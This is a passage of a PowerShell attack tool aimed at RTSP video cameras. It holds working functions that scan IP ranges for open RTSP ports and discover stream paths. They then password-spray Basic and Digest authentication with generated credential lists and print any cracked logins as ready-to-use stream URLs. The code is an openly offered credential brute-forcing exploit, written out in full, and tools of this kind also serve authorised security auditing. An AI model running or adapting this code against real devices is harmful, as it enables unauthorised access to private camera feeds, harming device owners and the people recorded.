        [Parameter(Mandatory = $false)]
        [string]$CustomUsername,
        [Parameter(Mandatory = $false)]
        [string]$CustomPassword,
        [Parameter(Mandatory = $false)]
        [string]$CustomCreds
    )

    $credentials = GenerateCreds -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds
    
    # Validate credentials were generated
    if ($null -eq $credentials -or $credentials.Count -eq 0) {
        Write-Warning "No credentials generated for $IP`:$Port/$Path"
        return [PSCustomObject]@{
            Credential = $null
            CredentialFound = $false
        }
    }
    
    Write-Verbose "========================================================="
    Write-Verbose "Starting credential spray for: $IP`:$Port/$Path"
    Write-Verbose "Auth Type: $authType"
    Write-Verbose "Total credentials to test: $($credentials.Count)"
    Write-Verbose "========================================================="
    
    $parentActivity = "Checking`: $IP`:$Port/$Path"
    $parentStatus = "Starting"
    $parentId = Get-Random

    $credentialStep = 0
    $totalCredentials = $credentials.Count

    foreach ($cred in $credentials) {
        try {
            $credentialStep++
            $childActivity = "Trying credential $($credentialStep)/$totalCredentials"
            $childStatus = "Working"
            $childId = Get-Random

            $parentProgress = [math]::Floor(($credentialStep / $totalCredentials) * 100)
            Write-Progress -Id $parentId -Activity $parentActivity -Status $parentStatus -PercentComplete $parentProgress -CurrentOperation $childActivity -SecondsRemaining (-1)

            # Decode credential for verbose output
            $decodedCred = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cred))
            Write-Verbose "[$credentialStep/$totalCredentials] Testing: $decodedCred"

            if ($authType -eq "Digest"){
                # Use Digest Auth Mode
                $validCred = Test-DigestRTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
            } elseif ($authType -eq "Basic") {
                # Use Basic Auth Mode
                $validCred = Test-BasicRTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
            } elseif ($authType -eq "Unknown"){
                # At the moment, if an Unknown Auth Type is detected in the initial AuthType Checks (hopefully not) It just resorts to checking Basic Auth
                # Further checks/attacks need to be implimented here.
                $validCred = Test-BasicRTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
            }

            if ($validCred) {
                # Clear ALL progress bars completely to ensure output is visible
                Write-Progress -Id $parentId -Activity $parentActivity -Completed
                Write-Progress -Id $childId -Activity $childActivity -Completed
                
                # Small delay to ensure progress bars are cleared
                Start-Sleep -Milliseconds 100
                
                # Immediate output when credentials are found (flush to console immediately)
                [Console]::Out.Flush()
                Write-Host ""
                Write-Host -ForegroundColor Yellow -NoNewline "====="
                Write-Host -NoNewline " CREDENTIALS FOUND "
                Write-Host -ForegroundColor Yellow "====="
                Write-Host -NoNewline -ForegroundColor Green "[+] "
                Write-Host "Path: $IP`:$Port/$Path"
                Write-Host -NoNewline -ForegroundColor Green "[+] "
                Write-Host "Credentials: $validCred"
                $fullRTSPString = "rtsp://$validCred@$IP`:$Port/$Path"
                Write-Host -NoNewline -ForegroundColor Green "[RTSP] "
                Write-Host "$fullRTSPString"
                Write-Host ""
                [Console]::Out.Flush()
                
                Write-Verbose "========================================================="
                Write-Verbose "CREDENTIALS FOUND for $IP`:$Port/$Path"
                Write-Verbose "========================================================="

                return [PSCustomObject]@{
                    Credential = $validCred
                    CredentialFound = $true
                }
            } else {
                $childStatus = "Failed"
                Write-Progress -Id $childId -Activity $childActivity -Status $childStatus -PercentComplete 100 -Completed -ParentId $parentId
                Write-Verbose "? Credential failed: $decodedCred"
            }
        }
        catch [System.OperationCanceledException] {
            # Ctrl+C pressed - stop current credential testing and return null
            Write-Host "`r`n[!] Password spray interrupted by user - moving to next target" -ForegroundColor Yellow
            Write-Progress -Id $parentId -Activity $parentActivity -Status "Cancelled" -Completed
            return [PSCustomObject]@{
                Credential = $null
                CredentialFound = $false
            }
        }
        catch {
            # Other errors - continue to next credential
            continue
        }
    }

    Write-Progress -Id $parentId -Activity $parentActivity -Status "Failed" -PercentComplete 100 -Completed
    Write-Verbose "========================================================="
    Write-Verbose "? No valid credentials found for $IP`:$Port/$Path"
    Write-Verbose "Tested $totalCredentials credentials"
    Write-Verbose "========================================================="

    return [PSCustomObject]@{
        Credential = $null
        CredentialFound = $false
    }
}

function Test-BasicRTSPAuth {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$IP,
        [Parameter(Mandatory)]
        [int]$Port,
        [Parameter(Mandatory)]
        [string]$Path,
        [Parameter(Mandatory)]
        [string]$Credential
    )

    $CRLF = [char]13 + [char]10

    $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
               "CSeq: 1$CRLF" +
               "Authorization: Basic $Credential$CRLF$CRLF"
    
    Write-Verbose "--- Basic Auth Request ---"
    Write-Verbose $request
    Write-Verbose "--- End Request ---"

	$tcpClient = $null
	$stream = $null
	$writer = $null
	$reader = $null

	try {
		$tcpClient = New-Object System.Net.Sockets.TcpClient
		$tcpClient.ReceiveTimeout = $Timeout
		$tcpClient.Connect($IP, $Port)

		$stream = $tcpClient.GetStream()
		$writer = New-Object System.IO.StreamWriter($stream)
		$writer.Write($request)
		$writer.Flush()

		$reader = New-Object System.IO.StreamReader($stream)
		
		# Read response with bounded line count to avoid infinite loops
		$maxLinesToRead = 20
		$linesRead = 0
		$statusLine = $null
		$responseLines = @()
		
		while (!$reader.EndOfStream -and $linesRead -lt $maxLinesToRead) {
			$line = $reader.ReadLine()
			$linesRead++
			$responseLines += $line
			
			# Capture status line
			if ($null -eq $statusLine -and $line -match '^RTSP/1\.0') {
				$statusLine = $line
			}
			
			# Check for success (200 OK)
			if ($line -match 'RTSP/1\.0\s+200') {
				Write-Verbose "--- Basic Auth Response (SUCCESS) ---"
				Write-Verbose ($responseLines -join "`r`n")
				Write-Verbose "--- End Response ---"
				$credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Credential))
				Write-Verbose "Valid credentials found: $credentials"
				return $credentials
			}
			
			# If we found status line and it's not 200, we can break early for 401/403
			if ($statusLine -and ($statusLine -match 'RTSP/1\.0\s+(401|403)')) {
				Write-Verbose "--- Basic Auth Response (FAILED) ---"
				Write-Verbose ($responseLines -join "`r`n")
				Write-Verbose "--- End Response ---"
				break
			}
			
			# Empty line indicates end of headers
			if ([string]::IsNullOrWhiteSpace($line) -and $statusLine) {
				Write-Verbose "--- Basic Auth Response ---"
				Write-Verbose ($responseLines -join "`r`n")
				Write-Verbose "--- End Response ---"
				break
			}
		}
    }
    catch [System.Net.Sockets.SocketException] {
        Write-Warning "Connection refused by $IP`:$Port Waiting 30s before continuing."
        Start-Sleep -Seconds 30
    }
    catch {
       # Error catch for debugging, usually non url compliant path.
       # Write-Warning "An error occurred: $_"
    }
    finally {
		if ($null -ne $reader) { $reader.Dispose() }
		if ($null -ne $writer) { $writer.Dispose() }
		if ($null -ne $stream) { $stream.Dispose() }
		if ($null -ne $tcpClient) { $tcpClient.Dispose() }
    }

    return $null
}

function Test-DigestRTSPAuth {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$IP,
        [Parameter(Mandatory)]
        [int]$Port,
        [Parameter(Mandatory)]
        [string]$Path,
        [Parameter(Mandatory)]
        [string]$Credential
    )

    $decodedCredentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Credential))
    $usrpass = $decodedCredentials.split(':')
    $username = $usrpass[0]
    $password = $usrpass[1]
    
    $CRLF = [char]13 + [char]10
    
	$tcpClient = $null
	$stream = $null
	$writer = $null
	$reader = $null

	try {
        $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
                   "CSeq: 1$CRLF$CRLF"

        $uri = "rtsp://$IP`:$Port/$Path"
        
        Write-Verbose "--- Digest Auth Initial Request ---"
        Write-Verbose $request
        Write-Verbose "--- End Request ---"
        
		$tcpClient = New-Object System.Net.Sockets.TcpClient
		$tcpClient.ReceiveTimeout = 200  # 200ms timeout - fast enough for testing thousands of creds
		$tcpClient.Connect($IP, $Port)

		$stream = $tcpClient.GetStream()
		$stream.ReadTimeout = 200  # Set stream timeout as well
		$writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::ASCII)
		$writer.Write($request)
		$writer.Flush()

		$reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::ASCII)
        
        $digestProcessed = $false
        $challengeResponse = @()
        $wwwAuthenticateHeader = $null
        $inWWWAuthenticate = $false
        $headerComplete = $false

        # Read response lines to find and collect the complete WWW-Authenticate header
        $maxLinesToRead = 15  # Reduced for faster processing when testing thousands of creds
        $linesRead = 0
        
        # First, read all response lines to get the complete WWW-Authenticate header
        while (!$reader.EndOfStream -and $linesRead -lt $maxLinesToRead -and !$headerComplete) {
            $response = $reader.ReadLine()
            $challengeResponse += $response
            $linesRead++

            # Check if this line starts WWW-Authenticate header
            if ($response -match "(?i)^WWW-Authenticate:\s*(.+)") {
                $inWWWAuthenticate = $true
                $wwwAuthenticateHeader = $matches[1]
            }
            # Check if this is a continuation line (starts with space or tab)
            elseif ($inWWWAuthenticate -and $response -match "^\s+(.+)") {
                $wwwAuthenticateHeader += " " + $matches[1]
            }
            # If we hit an empty line, we're done with headers - process WWW-Authenticate if we have it
            elseif ([string]::IsNullOrWhiteSpace($response)) {
                if ($inWWWAuthenticate -and $wwwAuthenticateHeader) {
                    $headerComplete = $true
                }
                break  # Empty line means end of headers
            }
            # If we hit another header (not WWW-Authenticate), we might be done with WWW-Authenticate
            elseif (($response -match "^[A-Za-z-]+:") -and ($response -notmatch "(?i)^WWW-Authenticate:")) {
                if ($inWWWAuthenticate -and $wwwAuthenticateHeader) {
                    $headerComplete = $true
                }
            }
        }
        
        # Now process the complete WWW-Authenticate header if we have one
        if ($headerComplete -and $wwwAuthenticateHeader -and $wwwAuthenticateHeader -match "(?i)\bDigest\b" -and !$digestProcessed) {
            Write-Verbose "--- Digest Auth Challenge Response ---"
            Write-Verbose ($challengeResponse -join "`r`n")
            Write-Verbose "--- End Response ---"
            Write-Verbose "Complete WWW-Authenticate header: $wwwAuthenticateHeader"
            
            # Extract Realm and Nonce from the complete header
            $realmPattern = 'realm="([^"]+)"'
            $noncePattern = 'nonce="([^"]+)"'
            $realm = if ($wwwAuthenticateHeader -match $realmPattern) { $matches[1] } else { $null }
            $nonce = if ($wwwAuthenticateHeader -match $noncePattern) { $matches[1] } else { $null }
            
            Write-Verbose "Extracted - Realm: $realm, Nonce: $nonce"
            
            # Validate we have both realm and nonce before proceeding
            if ($realm -and $nonce) {
                # Create the response
                $DigestResponse =  GenerateDigest -username $username -password $password -realm $realm -uri $uri -nonce $nonce
                Write-Verbose "Generated Digest Response: $DigestResponse"
                
                # Construct the second request
                $authUri = "rtsp://$IP`:$Port/$Path"
                # Build auth header using string formatting to avoid quote escaping issues
                $authHeader = 'Authorization: Digest username="{0}", password="{1}", realm="{2}", nonce="{3}", uri="{4}", response="{5}"' -f $username, $password, $realm, $nonce, $authUri, $DigestResponse
                $request2 = "DESCRIBE $authUri RTSP/1.0$CRLF" +
                            "CSeq: 1$CRLF" +
                            "$authHeader$CRLF$CRLF"
                
                Write-Verbose "--- Digest Auth Authenticated Request ---"
                Write-Verbose $request2
                Write-Verbose "--- End Request ---"
                
                # Send it
                $writer.Write($request2)
                $writer.Flush()

                # Read a bounded number of lines looking for 200 OK to avoid slow/hanging loops
                $maxLinesToRead2 = 15  # Reduced for faster processing when testing thousands of creds
                $finalResponse = @()
                for ($i = 0; $i -lt $maxLinesToRead2; $i++) {
                    if ($reader.EndOfStream) { break }
                    $responseLine = $reader.ReadLine()
                    $finalResponse += $responseLine

                    # Match RTSP/1.0 200 with any status text (OK, Success, etc.)
                    if ($responseLine -match 'RTSP/1\.0\s+200') {
                        Write-Verbose "--- Digest Auth Final Response (SUCCESS) ---"
                        Write-Verbose ($finalResponse -join "`r`n")
                        Write-Verbose "--- End Response ---"
                        Write-Verbose "Valid credentials found: $decodedCredentials"
                        $digestProcessed = $true
                        # Close connection immediately after success to free resources
                        if ($null -ne $reader) { $reader.Close() }
                        if ($null -ne $writer) { $writer.Close() }
                        if ($null -ne $stream) { $stream.Close() }
                        if ($null -ne $tcpClient) { $tcpClient.Close() }
                        return $decodedCredentials # Return the decoded Creds once 200 OK is received
                    }
                    
                    # Empty line indicates end of headers
                    if ([string]::IsNullOrWhiteSpace($responseLine)) {
                        Write-Verbose "--- Digest Auth Final Response (FAILED) ---"
                        Write-Verbose ($finalResponse -join "`r`n")
                        Write-Verbose "--- End Response ---"
                        break
                    }
                }

                $digestProcessed = $true
                # Close connection after processing to free resources quickly
                if ($null -ne $reader) { $reader.Close() }
                if ($null -ne $writer) { $writer.Close() }
                if ($null -ne $stream) { $stream.Close() }
                if ($null -ne $tcpClient) { $tcpClient.Close() }
            } else {
                Write-Verbose "ERROR: Could not extract realm and/or nonce from WWW-Authenticate header"
                Write-Verbose "Header was: $wwwAuthenticateHeader"
            }
        } elseif (!$headerComplete -and $linesRead -ge $maxLinesToRead) {
            Write-Verbose "WARNING: Reached max lines to read without finding complete WWW-Authenticate header"
            Write-Verbose "Response so far: $($challengeResponse -join '`r`n')"
        }

    }
    catch [System.Net.Sockets.SocketException] {
        Write-Warning "Connection refused by $IP`:$Port Waiting 30s before continuing."
        Start-Sleep -Seconds 30
    }
    catch {
       # Error catch for debugging, usually non url compliant path.
       # Write-Warning "An error occurred: $_"
    }
    finally {
		if ($null -ne $reader) { $reader.Dispose() }
		if ($null -ne $writer) { $writer.Dispose() }
		if ($null -ne $stream) { $stream.Dispose() }
		if ($null -ne $tcpClient) { $tcpClient.Dispose() }
    }

    return $null
}

function Scan {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Targets
        )

    $ipRange = Get-IpRange -Target $Targets
    $antiSpam = Get-OpenRTSPPorts -IPAddress $ipRange

    Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
    Write-Host "=========================================================`r`n"
   
}

function NoAuthScan {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Targets
    )

    $ipRange = Get-IpRange -Target $Targets
    $openPorts = Get-OpenRTSPPorts -IPAddress $ipRange

    # Check if there are any unique IP addresses with open ports
    $uniqueIPsWithOpenPorts = $openPorts | Select-Object -ExpandProperty IPAddress -Unique

    if ($uniqueIPsWithOpenPorts.Count -gt 0) {
    
       $variableToStopSpam = Get-ValidRTSPPaths -OpenPorts $openPorts
    }
    
    Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
    Write-Host "=========================================================`r`n"
}

function AuthAttack {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$Path,
        [Parameter(Mandatory = $false)]
        [string]$CustomUsername,
        [Parameter(Mandatory = $false)]
        [string]$CustomPassword,
        [Parameter(Mandatory = $false)]
        [string]$CustomCreds,
        [Parameter(Mandatory = $false)]
        [Switch]$Common
    )
    $ipAndPort = $Target.Split(':')
    $ip = $ipAndPort[0]
    $port = $ipAndPort[1]



	# Initialize collections to ensure reliable concatenation/accumulation
	$cliaddress = @()
	$validCredentials = @()

    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.SendTimeout = 100
        $tcpClient.ReceiveTimeout = $Timeout
        $awaitResult = $tcpClient.BeginConnect($ip, $port, $null, $null)
        $success = $awaitResult.AsyncWaitHandle.WaitOne(100, $false)

        if ($success) {
            $tcpClient.EndConnect($awaitResult)
            if ($tcpClient.Connected) {
                Write-Host -NoNewline -ForegroundColor Green "[+]"
                Write-Host -NoNewline " Open: "
                Write-Host -ForegroundColor Green "$ip`:$port"
                $cliaddress += [PSCustomObject]@{
                    IPAddress = $ip
                    Port      = $port
                    Status    = "Open"
                }
                $tcpClient.Close()
            }
        } else {
            Write-Host -NoNewline -ForegroundColor Red "[!]"
            Write-Host -NoNewline " Not Open: "
            Write-Host -ForegroundColor Red "$ip`:$port"
            return
        }
    } 
    catch {
    
    }


    if ($PSBoundParameters.ContainsKey('Path')) {
        # Path parameter is provided, create a PSCustomObject directly
        $getAuth = Get-AuthType -OpenPorts $cliaddress
        $authRequiredPaths = [PSCustomObject]@{
            IPAddress = $ip
            Port      = $port
            Path      = $Path
            AuthType  = $getAuth.authType
        }
    }
    else {
        # Path parameter is not provided, use the default behavior
        $getAuth = Get-AuthType -OpenPorts $cliaddress
        $AuthConstruct = [PSCustomObject]@{
            IPAddress = $ip
            Port      = $port
            AuthType  = $getAuth.authType
        }
        $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $AuthConstruct -UseCommonPaths:$Common
    }


    if ($authRequiredPaths -is [System.Array]) {
        if ($authRequiredPaths.Count -gt 0) {
            Write-Host "=========================================================`r`n"
            Write-Host "Beginning Password Spray:`r`n"

            # Group paths by IP:Port to process each port independently
            $pathsByPort = $authRequiredPaths | Group-Object -Property { "$($_.IPAddress):$($_.Port)" }
            $portsWithCreds = @{}  # Track which ports have found credentials

            # Process each port group
            foreach ($portGroup in $pathsByPort) {
                $portKey = $portGroup.Name
                $portPaths = $portGroup.Group
                
                # Skip this port if we already found credentials for it
                if ($portsWithCreds.ContainsKey($portKey)) {
                    continue
                }

                $credFoundForPort = $false

                # Test credentials for each path in this port (stop when found)
                foreach ($authPath in $portPaths) {
                    if ($credFoundForPort) { break }  # Stop testing this port if credentials found

                    try {
                        $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -authType $authPath.authType `
                            -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds

                        # Check if credentials were found
                        if ($null -ne $result -and $result.PSObject.Properties['CredentialFound'] -and $result.CredentialFound -eq $true) {
                            # Credentials already printed immediately in Get-ValidRTSPCredential
                            # Just store for summary at the end
                            if ($null -ne $result.PSObject.Properties['Credential'] -and $null -ne $result.Credential -and $result.Credential -ne "") {
                                $validCredentials += [PSCustomObject]@{
                                    IPAddress   = $authPath.IPAddress
                                    Port        = $authPath.Port
                                    Path        = $authPath.Path
                                    Credentials = $result.Credential
                                }
                                
                                $portsWithCreds[$portKey] = $true
                                $credFoundForPort = $true
                            }
                        }
                    }
                    catch [System.OperationCanceledException] {
                        # Ctrl+C pressed - stop current path and move to next port
                        Write-Host "`r`n[!] Password spray interrupted - moving to next port" -ForegroundColor Yellow
                        break
                    }
                    catch {
                        # Other errors - continue to next path
                        continue
                    }
                }
            }
        }
    } elseif ($null -eq $authRequiredPaths) {

        Write-Host -NoNewline -ForegroundColor Green "[+]"
        Write-Host " No Auth Detected, See results above.`r`n"

    } else {
        # $authRequiredPaths is a single object, handle it separately
        Write-Host "Beginning Password Spray:`r`n"

        $result = Get-ValidRTSPCredential -IP $authRequiredPaths.IPAddress -Port $authRequiredPaths.Port -Path $authRequiredPaths.Path -authType $authRequiredPaths.authType `
            -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds
        

        # Check if credentials were found
        if ($null -ne $result -and $result.PSObject.Properties['CredentialFound'] -and $result.CredentialFound -eq $true) {
            # Credentials already printed immediately in Get-ValidRTSPCredential
            # Just store for summary at the end
            if ($null -ne $result.PSObject.Properties['Credential'] -and $null -ne $result.Credential -and $result.Credential -ne "") {
                $validCredentials += [PSCustomObject]@{
                    IPAddress   = $authRequiredPaths.IPAddress
                    Port        = $authRequiredPaths.Port
                    Path        = $authRequiredPaths.Path
                    Credentials = $result.Credential
                }
            }
        }
    }

    # Print summary of all found credentials at the end (same format as FullAuto)
    Write-Host ""
    if ($validCredentials.Count -gt 0) {
        Write-Host -ForegroundColor Yellow "========================================================="
        Write-Host -ForegroundColor Yellow "           SUMMARY - ALL FOUND CREDENTIALS"
        Write-Host -ForegroundColor Yellow "========================================================="
        Write-Host ""
        foreach ($cred in $validCredentials) {
            Write-Host -NoNewline -ForegroundColor Green "[+] "
            Write-Host "$($cred.IPAddress):$($cred.Port)/$($cred.Path) - $($cred.Credentials)"
            Write-Host -NoNewline -ForegroundColor Green "[RTSP] "
            Write-Host "rtsp://$($cred.Credentials)@$($cred.IPAddress):$($cred.Port)/$($cred.Path)"
            Write-Host ""
        }
        Write-Host -ForegroundColor Yellow "========================================================="
        Write-Host ""
    } else {
        Write-Host -ForegroundColor Yellow "No credentials found during password spray."
        Write-Host ""
    }

    Write-Host "Scan completed.`r`n" -ForegroundColor Green
    Write-Host "=========================================================`r`n"
}

function FullAuto {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Targets,
        [Parameter(Mandatory = $false)]
        [string]$CustomUsername,
        [Parameter(Mandatory = $false)]
        [string]$CustomPassword,
        [Parameter(Mandatory = $false)]
        [string]$CustomCreds,
        [Parameter(Mandatory = $false)]
        [Switch]$Common
    )

    $ipRange = Get-IpRange -Target $Targets
    $openPorts = Get-OpenRTSPPorts -IPAddress $ipRange
    
    # Check if there are any unique IP addresses with open ports
    $uniqueIPsWithOpenPorts = $openPorts | Select-Object -ExpandProperty IPAddress -Unique

    if ($uniqueIPsWithOpenPorts.Count -gt 0) {
        $authTypeResult = Get-AuthType -OpenPorts $openPorts
        
        if ($null -eq $authTypeResult -or $authTypeResult.Count -eq 0) {
            Write-Host "No auth types found. Scan completed." -ForegroundColor Yellow
            return
        }
        
        $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $authTypeResult -UseCommonPaths:$Common
        $validCredentials = @()

        # Ensure authRequiredPaths is always an array (handle single object returns)
        if ($null -eq $authRequiredPaths) {
            $authRequiredPaths = @()
        } else {
            # Force to array - @() ensures it's always an array even if single object
            $authRequiredPaths = @($authRequiredPaths)
        }

        if ($authRequiredPaths.Count -gt 0) {

            Write-Host "Beginning Password Spray:`r`n"

            # Group paths by IP:Port to process each port independently
            $pathsByPort = $authRequiredPaths | Group-Object -Property { "$($_.IPAddress):$($_.Port)" }
            $portsWithCreds = @{}  # Track which ports have found credentials

            # Process each port group
            foreach ($portGroup in $pathsByPort) {
                $portKey = $portGroup.Name
                $portPaths = $portGroup.Group
                
                # Skip this port if we already found credentials for it
                if ($portsWithCreds.ContainsKey($portKey)) {
                    continue
                }

                $credFoundForPort = $false

                # Test credentials for each path in this port (stop when found)
                foreach ($authPath in $portPaths) {
                    if ($credFoundForPort) { break }  # Stop testing this port if credentials found

                    try {
                        $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -authType $authPath.authType `
                            -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds

                        # Check if credentials were found
                        if ($null -ne $result -and $result.PSObject.Properties['CredentialFound'] -and $result.CredentialFound -eq $true) {
                            # Credentials already printed immediately in Get-ValidRTSPCredential
                            # Just store for summary at the end
                            if ($null -ne $result.PSObject.Properties['Credential'] -and $null -ne $result.Credential -and $result.Credential -ne "") {
                                $validCredentials += [PSCustomObject]@{
                                    IPAddress   = $authPath.IPAddress
                                    Port        = $authPath.Port
                                    Path        = $authPath.Path
                                    Credentials = $result.Credential
                                }
                                
                                $portsWithCreds[$portKey] = $true
                                $credFoundForPort = $true
                            }
                        }
                    }
                    catch [System.OperationCanceledException] {
                        # Ctrl+C pressed - stop current path and move to next port
                        Write-Host "`r`n[!] Password spray interrupted - moving to next port" -ForegroundColor Yellow
                        break
                    }
                    catch {
                        # Other errors - continue to next path
                        continue
                    }
                }
            }

            # Print summary of all found credentials at the end (after all port groups are processed)
            Write-Host ""
            if ($validCredentials.Count -gt 0) {
                Write-Host -ForegroundColor Yellow "========================================================="
                Write-Host -ForegroundColor Yellow "           SUMMARY - ALL FOUND CREDENTIALS"
                Write-Host -ForegroundColor Yellow "========================================================="
                Write-Host ""
                foreach ($cred in $validCredentials) {
                    Write-Host -NoNewline -ForegroundColor Green "[+] "
                    Write-Host "$($cred.IPAddress):$($cred.Port)/$($cred.Path) - $($cred.Credentials)"
                    Write-Host -NoNewline -ForegroundColor Green "[RTSP] "
                    Write-Host "rtsp://$($cred.Credentials)@$($cred.IPAddress):$($cred.Port)/$($cred.Path)"
                    Write-Host ""
                }
                Write-Host -ForegroundColor Yellow "========================================================="
                Write-Host ""
            } else {
                Write-Host -ForegroundColor Yellow "No credentials found during password spray."
                Write-Host ""
            }

        }
        else {
            Write-Host "=========================================================`r`n"
            Write-Host "No authentication required, see results above.`r`n"
            Write-Host "Scan completed.`r`n" -ForegroundColor Green
            Write-Host "=========================================================`r`n"
        }
    }
    Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
    Write-Host "=========================================================`r`n"
}
